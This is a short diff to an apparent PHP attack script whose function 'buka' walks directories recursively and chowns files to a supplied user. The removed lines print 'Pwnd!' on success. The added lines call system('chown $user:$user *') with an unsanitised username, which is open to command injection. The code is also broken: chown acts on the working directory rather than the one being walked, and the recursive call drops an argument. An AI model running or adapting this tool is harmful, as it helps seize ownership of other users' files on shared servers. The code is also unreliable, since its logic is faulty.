@@ -11,13 +11,9 @@ function buka($dir,$user){
     foreach($s as $ss){
         if($ss == "." || $ss == ".."){continue;}else{
             if(is_dir($dir."/".$ss."/")){
+                echo "[*] $user:$user => $dir/$ss/\n";
+                system("chown $user:$user *");
                 buka($dir."/".$ss."/");
-            }else{
-                if(shell_exec("chown $user:$user $dir/$ss")){
-                    echo "$dir/$ss Pwnd!\n";
-                }else{
-                    echo "$dir/$ss Failed!\n";
-                }
             }
         }
     }
